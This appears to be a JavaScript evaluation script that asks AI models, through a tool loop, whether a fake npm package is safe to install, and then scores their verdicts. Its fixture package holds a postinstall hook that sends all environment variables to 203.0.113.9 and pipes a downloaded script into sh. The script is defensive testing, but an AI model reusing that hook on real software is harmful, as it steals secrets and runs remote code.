// M0 spike: model tool-call eval via REST. Usage: see README of M0.
// M0 spike: tool-call reliability eval. Local dev only (see index.ts).
const FILES = {
  'package.json': JSON.stringify({ name: 'left-padz', version: '1.0.2', scripts: { postinstall: 'node scripts/setup.js' } }, null, 2),
  'scripts/setup.js': `const https=require('https');const os=require('os');
const data=Buffer.from(JSON.stringify(process.env)).toString('base64');
const r=https.request({host:'203.0.113.9',path:'/c',method:'POST'});r.end(data);
require('child_process').exec('curl -s http://203.0.113.9/p | sh');`,
  'index.js': 'module.exports = (s, n) => String(s).padStart(n);',
};
const TOOLS = [
  { type: 'function', function: { name: 'read_file', description: 'Read a file from the repo', parameters: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } } },
  { type: 'function', function: { name: 'list_files', description: 'List all repo files', parameters: { type: 'object', properties: {} } } },
];
const PRICES = {
  '@cf/zai-org/glm-5.3-flash': [0.15, 0.5],
  '@cf/zai-org/glm-5.3': [1.4, 4.4],
  '@cf/google/gemma-4-26b-a4b-it': [0.1, 0.3],
};


const [,, ...models] = process.argv;
const token = process.env.CLOUDFLARE_API_TOKEN, acct = process.env.CLOUDFLARE_ACCOUNT_ID;
async function run(model) {
  const messages = [
    { role: 'system', content: 'You assess whether a repo is safe to run locally. Use tools to inspect files, then give a verdict: clear, suspicious, or likely malicious, with evidence.' },
    { role: 'user', content: 'Is this repo safe to npm install and run?' },
  ];
  let inTok=0,outTok=0,toolCalls=0,badCalls=0,turns=0,final='';
  for (; turns < 8; turns++) {
    const r = await fetch(`https://api.cloudflare.com/client/v4/accounts/${acct}/ai/v1/chat/completions`, { method:'POST', headers:{Authorization:`Bearer ${token}`,'content-type':'application/json'}, body: JSON.stringify({ model, messages, tools: TOOLS, max_completion_tokens: 1500 }) });
    const res = await r.json();
    if (!r.ok) { final = 'HTTP '+r.status+' '+JSON.stringify(res).slice(0,300); break; }
    inTok += res.usage?.prompt_tokens ?? 0; outTok += res.usage?.completion_tokens ?? 0;
    const msg = res.choices?.[0]?.message;
    if (!msg) { final = 'NO MESSAGE '+JSON.stringify(res).slice(0,300); break; }
    messages.push(msg);
    if (!msg.tool_calls?.length) { final = msg.content ?? ''; break; }
    for (const tc of msg.tool_calls) {
      toolCalls++; let out='error';
      try { const a = JSON.parse(tc.function.arguments||'{}');
        if (tc.function.name==='list_files') out=Object.keys(FILES).join('\n');
        else if (tc.function.name==='read_file' && FILES[a.path]!==undefined) out=FILES[a.path];
        else { badCalls++; out='not found'; } } catch { badCalls++; }
      messages.push({ role:'tool', tool_call_id: tc.id, content: out });
    }
  }
  const [pi,po] = PRICES[model] ?? [0,0];
  return { model, turns, toolCalls, badCalls,
    readSetupJs: messages.some(m=>m.tool_calls?.some(t=>t.function.arguments?.includes('setup.js'))),
    flagged: /malicious|suspicious/i.test(final) && /203\.0\.113\.9|exfil|env/i.test(final),
    tokens:{in:inTok,out:outTok}, costUsd:+((inTok*pi+outTok*po)/1e6).toFixed(5), final: final.slice(0,500) };
}
for (const m of models) console.log(JSON.stringify(await run(m).catch(e=>({model:m,error:String(e)})), null, 1));
